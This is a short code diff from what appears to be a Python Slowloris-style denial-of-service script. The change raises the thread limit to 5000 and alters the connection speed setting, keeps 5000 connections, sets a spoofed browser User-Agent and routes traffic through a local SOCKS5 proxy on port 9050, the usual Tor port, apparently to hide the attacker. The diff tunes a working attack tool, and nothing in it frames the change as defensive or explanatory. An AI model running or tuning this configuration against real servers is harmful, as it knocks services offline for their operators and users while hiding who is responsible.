@@ -42,9 +42,9 @@ def main(host, port, sockshost, socksport):
     loris.options['request'] += 'Host: %s\r\n' % (host)
     loris.options['request'] += 'User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8\r\n'
 
-    loris.options['threadlimit'] = 2500
+    loris.options['threadlimit'] = 5000
     loris.options['connectionlimit'] = 5000
-    loris.options['connectionspeed'] = 100
+    loris.options['connectionspeed'] = 1
 
     # Enable SOCKS5 on local port 9050
     loris.options['socksversion'] = 'SOCKS5'
